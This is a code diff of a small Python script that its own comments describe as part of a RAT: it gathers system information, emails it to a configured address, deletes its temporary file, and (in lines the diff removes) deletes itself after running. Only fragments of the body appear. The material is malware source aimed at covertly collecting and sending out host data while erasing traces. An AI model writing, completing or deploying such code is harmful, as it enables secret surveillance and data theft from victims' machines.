@@ -1,14 +1,14 @@
 #Import libs and dependancies for getting system info and downloading rest of rat
-import os, atexit, urllib.request, platform, socket, re, uuid, json, logging, time
+import os, urllib.request, platform, socket, re, uuid
 
 #Import libs and dependancies for compiling and sending email
 from email.message import EmailMessage
 import smtplib
 
 #Estabishing vars for email
-sender = "Sender email"
-password = "Sender password"
-receiver = "Receiver email"
+sender = ""
+password = ""
+receiver = ""
 open("info.txt", "w")
 
 #Crafting email
@@ -55,6 +55,3 @@ print("Successfully sent email...")
 #Deleting info.txt
 os.remove("info.txt")
 print("Deleted txt file...")
-
-#Deletes current script (SucicideSnake.py) after execution
-atexit.register(lambda file = __file__: os.remove(file))
